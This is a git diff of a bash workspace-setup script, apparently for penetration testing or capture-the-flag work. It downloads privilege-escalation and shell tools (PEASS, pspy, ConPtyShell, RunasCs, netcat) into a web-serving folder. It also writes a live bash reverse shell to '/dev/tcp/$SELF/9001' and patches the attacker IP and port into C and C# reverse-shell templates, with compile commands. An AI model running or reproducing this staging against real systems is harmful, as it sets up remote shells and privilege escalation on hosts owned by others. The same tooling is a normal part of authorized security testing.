@@ -91,8 +91,16 @@ export BOXNAME
 
 # setup workspace
 setup_workspace() {
-  mkdir -p "$HOME"/{nmap,www,$BOXNAME}
+  [ -n "$HOME" ] || { echo "create_workspace: HOME not set"; return 1; }
+
+  local dirs=(nmap www "$BOXNAME")
+  local d
+  for d in "${dirs[@]}"; do
+    mkdir -p -- "$HOME/$d" || { echo "Failed to create $HOME/$d"; return 1; }
+  done
+
   [ -f "$HOME/.hushlogin" ] || touch -- "$HOME/.hushlogin"
+
   # copy windows specific scripts to windows box or linux specific to linux box
   cd || exit
   [ -d "$HOME/Scripts" ] || git clone https://github.com/BeauJBurroughs/Scripts.git -q 
@@ -101,68 +109,68 @@ setup_workspace() {
   cp Scripts/.bash_aliases "$HOME/"
   cp Scripts/.tmux.conf "$HOME/"
   cp Scripts/.zshrc "$HOME/"
-  #rm -rf Scripts/
+  cp Scripts/shell.c "$HOME/www"
+  
+  if [[ "$OS" == 'win' ]]; then
+    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o "$HOME/www/winPEAS.bat"
+    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o "$HOME/www/winPEASx64.exe"
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe -o "$HOME/www/winPEASx64_ofs.exe"
+    
+    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -o "$HOME/www/winPEASany.exe"
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o "$HOME/www/winPEASany_ofs.exe"
+    
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -o "$HOME/www/winPEASx86.exe"
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86_ofs.exe -o "$HOME/www/winPEASx86_ofs.exe"
 
+    curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/latest/download/ConPtyShell.zip -o "$HOME/www/ConPtyShell.zip"
+    unzip -qq $HOME/www/ConPtyShell.zip -d "$HOME/www/"
+    rm "$HOME/www/"{ConPtyShell.zip,ConPtyShell_dotnet2.exe}
+    curl -s -L https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip -o $HOME/www/RunasCs.zip
+    unzip -qq $HOME/www/RunasCs.zip -d "$HOME/www/"
+    rm "$HOME/www/"{RunasCs_net2.exe,RunasCs.zip}
+    curl -s -L https://github.com/Friends-Security/SharpExclusionFinder/releases/latest/download/SharpExclusionFinder.exe -o "$HOME/www/SharpExclusionFinder.exe"
+    
+    # cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
+    cp /usr/share/windows-resources/binaries/nc.exe "$HOME/www"
+
+    curl -s -L https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1 -o "$HOME/www/Invoke-ConPtyShell.ps1"
+    curl -s -L https://gist.githubusercontent.com/BeauJBurroughs/319d4e67e421b909aa139402e2075c58/raw/56f4d8a5383b4aa2661b7eab30aaef5c1d3cd8ac/ConPtyShell.cs -o "$HOME/www/ConPtyShell.cs"
+    
+    cp Scripts/sslshell.ps1 "$HOME/www"
+    cp Scripts/put_server1.py "$HOME/www"
+
+  else # linux specific setup
+    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o "$HOME/www/linpeas.sh"
+    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o "$HOME/www/linpeas_linux_amd64"
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh -o "$HOME/www/linpeas_fat.sh"
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh -o "$HOME/www/linpeas_small.sh"
+    
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_386 -o "$HOME/www/linpeas_linux_386"
+    
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm64 -o "$HOME/www/linpeas_linux_arm64"
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm -o "$HOME/www/linpeas_linux_arm"
+    
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_amd64 -o "$HOME/www/linpeas_darwin_amd64"
+    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_arm64 -o "$HOME/www/linpeas_darwin_arm64"
+    
+    curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s -o "$HOME/www/pspy64s"
+    curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o "$HOME/www/pspy64"
+    cp Scripts/root.c "$HOME/www"
+  fi
+  rm -rf Scripts/
+  chmod 0644 "$HOME/notes" "$HOME/.hushlogin" >/dev/null 2>&1 || true
+  return 0
 }
 setup_workspace
-
-if [[ "$OS" == 'win' ]]; then
-  
-  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o "$HOME/www/winPEAS.bat"
-  
-  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o "$HOME/www/winPEASx64.exe"
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe -o "$HOME/www/winPEASx64_ofs.exe"
-  
-  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -o "$HOME/www/winPEASany.exe"
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o "$HOME/www/winPEASany_ofs.exe"
-  
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -o "$HOME/www/winPEASx86.exe"
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86_ofs.exe -o "$HOME/www/winPEASx86_ofs.exe"
-
-  # curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip -o "$HOME/www/"
-  # unzip $HOME/www/ConPtyShell.zip -d $HOME/www/
-  # curl -s -L https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip -o $HOME/www/
-  # unzip $HOME/www/RunasCs.zip -d $HOME/www/
-  # curl -s -L https://github.com/Friends-Security/SharpExclusionFinder/releases/download/v1/SharpExclusionFinder.exe -o $HOME/www/
-  # cp /opt/PEASS-ng/winPEAS/winPEASexe/binaries/Release/winPEASany.exe $HOME/www
-  # cp /opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat $HOME/www
-  # cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
-  cp /usr/share/windows-resources/binaries/nc.exe "$HOME/www"
-  cp /opt/ConPtyShell/Invoke-ConPtyShell.ps1  "$HOME/www"
-  echo "Invoke-ConPtyShell $SELF 9001" >> "$HOME/www/Invoke-ConPtyShell.ps1" ## move to modify shells?
-  cp /opt/ConPtyShell/ConPtyShell.exe "$HOME/www"
-  cp /opt/ConPtyShell/ConPtyShell.cs "$HOME/www" # get from gist and modify shell
-  cp /opt/RunasCs/RunasCs.exe "$HOME/www"
-  cp /opt/SharpExclusionFinder/SharpExclusionFinder.exe "$HOME/www"
-  cp /opt/Scripts/shell.c "$HOME/www"
-  cp /opt/Scripts/root.c "$HOME/www"
-  cp /opt/Scripts/sslshell.ps1 "$HOME/www"
-  cp /opt/Scripts/put_server1.py "$HOME/www"
-else # linux specific setup
-  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o "$HOME/www/linpeas.sh"
-  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o "$HOME/www/linpeas_linux_amd64"
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh -o "$HOME/www/linpeas_fat.sh"
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh -o "$HOME/www/linpeas_small.sh"
-  
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_386 -o "$HOME/www/linpeas_linux_386"
-  
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm64 -o "$HOME/www/linpeas_linux_arm64"
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm -o "$HOME/www/linpeas_linux_arm"
-  
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_amd64 -o "$HOME/www/linpeas_darwin_amd64"
-  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_arm64 -o "$HOME/www/linpeas_darwin_arm64"
-  
-  curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s -o "$HOME/www/pspy64s"
-  curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o "$HOME/www/pspy64"
-  cp Scripts/shell.c "$HOME/www"
-  cp Scripts/root.c "$HOME/www"
-  cp Scripts/sslshell.ps1 "$HOME/www" # don't need here i think...
-fi
 
 modify_shells() {
   # create the shell script (overwrite existing) and make executable
   printf '%s\n' '#!/bin/bash' "bash -i >& /dev/tcp/$SELF/9001 0>&1" > "$HOME/www/shell.sh"
   chmod +x "$HOME/www/shell.sh"
+
+  if [[ -f "$HOME/www/Invoke-ConPtyShell.ps1" ]]; then 
+    echo "Invoke-ConPtyShell $SELF 9001" >> "$HOME/www/Invoke-ConPtyShell.ps1"
+  fi
 
   # helper to run sed only if file exists
   _sed_if_exists() {
@@ -186,6 +194,16 @@ modify_shells() {
 
   # Replace placeholder in root.c
   _sed_if_exists "$HOME/www/root.c" "s|REPLACE_THIS_IP|$SELF|g"
+  
+  # Replace placeholder in ConPtyShell.cs
+  _sed_if_exists "$HOME/www/ConPtyShell.cs" "s|REPLACE_THIS_IP|$SELF|g"
+  _sed_if_exists "$HOME/www/ConPtyShell.cs" "s|REPLACE_THIS_PORT|9001|g"
+  # to compile on linux use mcs:
+  # mcs -sdk:4.7.1 -target:exe -optimize+ -out:ConPtyShell.exe ConPtyShell.cs
+  # or dotnet:
+  # dotnet new console -n ConPtyShell; cd ConPtyShell; mv ../ConPtyShell.cs Program.cs; 
+  # dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true
+  # mv bin/Release/net8.0/win-x64/publish/ConPtyShell.exe $HOME/www/ConPtyShell2.exe 
 
   echo "modify_shells: done (created $HOME/www/shell.sh and updated available templates)" 
 }
